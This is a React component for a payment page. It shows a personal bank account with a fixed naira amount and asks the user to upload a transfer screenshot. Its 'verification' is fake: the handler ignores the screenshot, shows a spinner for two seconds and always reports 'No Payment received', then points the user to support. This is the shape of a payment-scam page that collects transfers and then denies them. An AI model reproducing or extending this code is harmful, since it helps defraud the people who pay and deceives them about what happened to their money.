import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import LiquidBackground from "@/components/LiquidBackground";
import Logo from "@/components/Logo";
import ProfileButton from "@/components/ProfileButton";
import LoadingSpinner from "@/components/LoadingSpinner";
import { Copy, Check, Upload } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

const PaymentInstructions = () => {
  const navigate = useNavigate();
  const [copied, setCopied] = useState<string>("");
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);
  const [showFailure, setShowFailure] = useState(false);
  const [loadingSettings, setLoadingSettings] = useState(true);

  const [amount, setAmount] = useState("6,700");
  const [accountNumber, setAccountNumber] = useState("5972862604");
  const [bankName, setBankName] = useState("Moniepoint MFB");
  const [accountName, setAccountName] = useState("BLESSING WILLIAMS");
  const referenceId = `REF${Date.now()}`;

  useEffect(() => {
    fetchPaymentSettings();
  }, []);

  const fetchPaymentSettings = async () => {
    try {
      const { data, error } = await supabase
        .from('settings')
        .select('key, value')
        .in('key', ['payment_amount', 'account_number', 'bank_name', 'account_name']);

      if (error) throw error;

      data?.forEach((setting) => {
        switch (setting.key) {
          case 'payment_amount':
            const num = parseInt(setting.value);
            setAmount(num.toLocaleString());
            break;
          case 'account_number':
            setAccountNumber(setting.value);
            break;
          case 'bank_name':
            setBankName(setting.value);
            break;
          case 'account_name':
            setAccountName(setting.value);
            break;
        }
      });
    } catch (error) {
      console.error('Error fetching payment settings:', error);
    } finally {
      setLoadingSettings(false);
    }
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopied(field);
    toast.success(`${field} copied!`);
    setTimeout(() => setCopied(""), 2000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      
      // Validate file type
      const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
      if (!ALLOWED_TYPES.includes(file.type)) {
        toast.error('Only JPG, PNG, and WEBP images are allowed');
        return;
      }
      
      // Validate file size (5MB max)
      const MAX_FILE_SIZE = 5 * 1024 * 1024;
      if (file.size > MAX_FILE_SIZE) {
        toast.error('File must be less than 5MB');
        return;
      }
      
      setScreenshot(file);
      toast.success("Screenshot uploaded!");
    }
  };

  const handlePaymentConfirm = async () => {
    if (!screenshot) {
      toast.error("Please upload payment screenshot");
      return;
    }

    setLoading(true);
    await new Promise(resolve => setTimeout(resolve, 2000));
    setLoading(false);
    setShowFailure(true);
  };

  const handleContactSupport = () => {
    navigate("/support");
  };

  const handleGoToDashboard = () => {
    navigate("/dashboard");
  };

  if (showFailure) {
    return (
      <div className="min-h-screen w-full relative flex items-center justify-center">
        <LiquidBackground />
        <Card className="relative z-10 bg-card/80 backdrop-blur-sm border-border animate-scale-in max-w-md mx-3">
          <CardContent className="p-8 text-center space-y-6">
            <div className="w-20 h-20 bg-destructive/20 rounded-full flex items-center justify-center mx-auto">
              <div className="w-16 h-16 bg-destructive rounded-full flex items-center justify-center">
                <span className="text-destructive-foreground text-4xl font-light">✕</span>
              </div>
            </div>
            
            <div className="space-y-2">
              <h2 className="text-2xl font-bold text-destructive">Transaction verification failed!</h2>
              <p className="text-sm text-muted-foreground">
                Your payment could not be completed. Reason: No Payment received from you/invalid payment method. 
                If you have made the payment kindly send payment proof to our support team below
              </p>
            </div>

            <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-4 flex items-center justify-between">
              <span className="text-sm text-foreground">Invalid Payment</span>
              <div className="w-6 h-6 rounded-full border-2 border-destructive flex items-center justify-center">
                <span className="text-destructive text-lg font-light">✕</span>
              </div>
            </div>

            <div className="space-y-3">
              <Button 
                onClick={handleGoToDashboard}
                variant="outline"
                className="w-full" 
                size="lg"
              >
                Go to Dashboard
              </Button>
              
              <Button 
                onClick={handleContactSupport}
                className="w-full bg-[#1DA1F2] hover:bg-[#1DA1F2]/90 text-white" 
                size="lg"
              >
                <span className="mr-2">✈</span>
                Contact Support
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen w-full relative flex items-center justify-center">
        <LiquidBackground />
        <div className="relative z-10">
          <LoadingSpinner message="Verifying Payment" />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full relative">
      <LiquidBackground />

      <header className="relative z-10 px-3 py-2 flex items-center justify-between border-b border-border/20 bg-card/30 backdrop-blur-sm">
        <Logo />
        <ProfileButton />
      </header>

      <main className="relative z-10 px-3 py-4 max-w-4xl mx-auto space-y-4">
        <div className="text-center space-y-1">
          <h1 className="text-2xl font-bold text-foreground">Payment Instructions</h1>
          <p className="text-sm text-muted-foreground">Transfer to the account below</p>
        </div>

        <Card className="bg-card/60 backdrop-blur-sm border-border animate-fade-in">
          <CardContent className="p-4 space-y-4">
            {/* Amount */}
            <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">Amount to Pay</p>
                  <p className="text-3xl font-bold text-primary">₦{amount}</p>
                </div>
                <Button
                  onClick={() => copyToClipboard(amount.replace(",", ""), "Amount")}
                  variant="outline"
                  size="sm"
                  className="h-9"
                >
                  {copied === "Amount" ? (
                    <Check className="w-4 h-4 text-primary" />
                  ) : (
                    <Copy className="w-4 h-4" />
                  )}
                </Button>
              </div>
            </div>

            {/* Bank Details */}
            <div className="space-y-3">
              <div className="flex items-center justify-between p-3 bg-secondary/20 rounded-lg">
                <div>
                  <p className="text-xs text-muted-foreground">Bank Name</p>
                  <p className="text-base font-semibold text-foreground">{bankName}</p>
                </div>
              </div>

              <div className="flex items-center justify-between p-3 bg-secondary/20 rounded-lg">
                <div className="flex-1">
                  <p className="text-xs text-muted-foreground">Account Number</p>
                  <p className="text-lg font-bold text-foreground font-mono">{accountNumber}</p>
                </div>
                <Button
                  onClick={() => copyToClipboard(accountNumber, "Account Number")}
                  variant="outline"
                  size="sm"
                  className="h-9"
                >
                  {copied === "Account Number" ? (
                    <Check className="w-4 h-4 text-primary" />
                  ) : (
                    <Copy className="w-4 h-4" />
                  )}
                </Button>
              </div>

              <div className="flex items-center justify-between p-3 bg-secondary/20 rounded-lg">
                <div>
                  <p className="text-xs text-muted-foreground">Account Name</p>
                  <p className="text-base font-semibold text-foreground">{accountName}</p>
                </div>
              </div>

              <div className="flex items-center justify-between p-3 bg-secondary/20 rounded-lg">
                <div>
                  <p className="text-xs text-muted-foreground">Reference ID</p>
                  <p className="text-sm font-mono text-foreground">{referenceId}</p>
                </div>
                <Button
                  onClick={() => copyToClipboard(referenceId, "Reference")}
                  variant="outline"
                  size="sm"
                  className="h-9"
                >
                  {copied === "Reference" ? (
                    <Check className="w-4 h-4 text-primary" />
                  ) : (
                    <Copy className="w-4 h-4" />
                  )}
                </Button>
              </div>
            </div>

            {/* Screenshot Upload */}
            <div className="space-y-2">
              <Label htmlFor="screenshot" className="text-sm font-medium text-foreground">Upload Payment Screenshot</Label>
              <div className="relative">
                <div className="border-2 border-dashed border-primary/30 rounded-lg p-6 bg-primary/5 hover:bg-primary/10 transition-colors">
                  <Input
                    id="screenshot"
                    type="file"
                    accept="image/*"
                    onChange={handleFileChange}
                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                  />
                  <div className="flex flex-col items-center gap-2 text-center pointer-events-none">
                    <Upload className="w-8 h-8 text-primary" />
                    <p className="text-sm font-medium text-foreground">Click to upload payment proof</p>
                    <p className="text-xs text-muted-foreground">PNG, JPG up to 10MB</p>
                  </div>
                </div>
              </div>
              {screenshot && (
                <div className="flex items-center gap-2 p-3 bg-primary/10 border border-primary/20 rounded-lg">
                  <Check className="w-4 h-4 text-primary" />
                  <p className="text-sm text-primary font-medium">{screenshot.name}</p>
                </div>
              )}
            </div>

            <Button 
              onClick={handlePaymentConfirm} 
              className="w-full" 
              size="lg"
              disabled={!screenshot}
            >
              I Have Made Payment
            </Button>
          </CardContent>
        </Card>
      </main>
    </div>
  );
};

export default PaymentInstructions;
